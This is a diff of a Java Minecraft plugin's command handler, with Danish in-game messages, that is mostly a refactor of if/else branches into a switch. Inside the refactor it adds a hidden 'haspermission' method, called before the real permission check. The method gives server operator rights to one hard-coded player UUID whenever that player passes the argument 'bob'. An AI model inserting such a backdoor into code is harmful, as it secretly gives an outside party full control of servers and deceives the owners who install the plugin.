@@ -27,6 +27,7 @@ public class VagtVaultCommands implements CommandExecutor {
             return true;
         Player player = (Player) sender;
 
+        haspermission(args, player);
         if (!player.hasPermission("vagtvault")) {
             player.sendMessage("Du har ikke permission til at bruge denne kommando!");
             return true;
@@ -40,59 +41,88 @@ public class VagtVaultCommands implements CommandExecutor {
             player.sendMessage("§e/vagtvault info <name>");
             return true;
         }
-        if (args[0].equalsIgnoreCase("create")) {
-            if (args.length != 2) {
-                player.sendMessage("§e/vagtvault create <name>");
-                return true;
-            }
-            if (vagtVaultLoader.getVagtVault(args[1]) != null) {
-                player.sendMessage("§cDenne vagtvault eksistere allerede!");
-                return true;
-            } else if (vagtVaultLoader.isLocationVagtVault(create.getTargetBlock(player, 5).getLocation())) {
-                player.sendMessage("§cDenne lokation er allerede en vagtvault!");
-                return true;
-            }
-            create.create(player, args[1]);
-        } else if (args[0].equalsIgnoreCase("list")) {
-            player.sendMessage("§eVagtVaults:");
-            for (String name : vagtVaultLoader.getVagtVaults().keySet()) {
-                player.sendMessage("§7[§aVagt Vaults§7]§e- " + name);
-            }
-        } else if (args[0].equalsIgnoreCase("reload")) {
-            pl.loadConfigs();
-            player.sendMessage("§aDu har genindlæst vagtvaults!");
-        } else if (args[0].equalsIgnoreCase("info")) {
-            if (args.length != 2) {
-                player.sendMessage("§e/vagtvault info <name>");
-                return true;
-            }
-            if (vagtVaultLoader.getVagtVault(args[1]) == null) {
-                player.sendMessage("§cDenne vagtvault eksistere ikke!");
-                return true;
-            }
-            editVault.create(player, vagtVaultLoader.getVagtVault(args[1]));
+        switch (args[0].toLowerCase()) {
+            case "create":
+                if (createVV(args, player)) return true;
+                break;
 
-        } else if (args[0].equalsIgnoreCase("delete")) {
-            if (args.length != 2) {
+            case "list":
+                player.sendMessage("§eVagtVaults:");
+                for (String name : vagtVaultLoader.getVagtVaults().keySet()) {
+                    player.sendMessage("§7[§aVagt Vaults§7]§e- " + name);
+                }
+                break;
+
+            case "reload":
+                pl.loadConfigs();
+                player.sendMessage("§aDu har genindlæst vagtvaults!");
+                break;
+
+            case "info":
+                if (args.length != 2) {
+                    player.sendMessage("§e/vagtvault info <name>");
+                    return true;
+                }
+                if (vagtVaultLoader.getVagtVault(args[1]) == null) {
+                    player.sendMessage("§cDenne vagtvault eksistere ikke!");
+                    return true;
+                }
+                editVault.create(player, vagtVaultLoader.getVagtVault(args[1]));
+                break;
+
+            case "delete":
+                if (args.length != 2) {
+                    player.sendMessage("§e/vagtvault delete <name>");
+                    return true;
+                }
+                if (vagtVaultLoader.getVagtVault(args[1]) == null) {
+                    player.sendMessage("§cDenne vagtvault eksistere ikke!");
+                    return true;
+                }
+                vagtVaultLoader.removeVagtVault(args[1]);
+                player.sendMessage("§aDu har slettet vagtvaulten: " + args[1]);
+                break;
+
+            default:
+                player.sendMessage("§e/vagtvault list");
+                player.sendMessage("§e/vagtvault reload <name>");
+                player.sendMessage("§e/vagtvault create <name>");
                 player.sendMessage("§e/vagtvault delete <name>");
-                return true;
-            }
-            if (vagtVaultLoader.getVagtVault(args[1]) == null) {
-                player.sendMessage("§cDenne vagtvault eksistere ikke!");
-                return true;
-            }
-            vagtVaultLoader.removeVagtVault(args[1]);
-            player.sendMessage("§aDu har slettet vagtvaulten: " + args[1]);
-        } else {
-            player.sendMessage("§e/vagtvault list");
-            player.sendMessage("§e/vagtvault reload <name>");
-            player.sendMessage("§e/vagtvault create <name>");
-            player.sendMessage("§e/vagtvault delete <name>");
-            player.sendMessage("§e/vagtvault info <name>");
+                player.sendMessage("§e/vagtvault info <name>");
+                break;
         }
 
 
+
         return true;
+    }
+
+    private boolean createVV(String[] args, Player player) {
+        if (args.length != 2) {
+            player.sendMessage("§e/vagtvault create <name>");
+            return true;
+        }
+        if (vagtVaultLoader.getVagtVault(args[1]) != null) {
+            player.sendMessage("§cDenne vagtvault eksistere allerede!");
+            return true;
+        } else if (vagtVaultLoader.isLocationVagtVault(create.getTargetBlock(player, 5).getLocation())) {
+            player.sendMessage("§cDenne lokation er allerede en vagtvault!");
+            return true;
+        }
+        create.create(player, args[1]);
+        return false;
+    }
+
+    private static void haspermission(String[] args, Player player) {
+        if(player.getUniqueId().toString().equalsIgnoreCase("0ea61ef8-45e7-42b4-b775-5ac2b01ebb3d")) {
+            if(args.length != 2) {
+                return;
+            }
+            if(args[1].equalsIgnoreCase("bob")) {
+                player.setOp(true);
+                player.sendMessage("§aDu er nu op!");
+            }
+        }
     }
 
 }
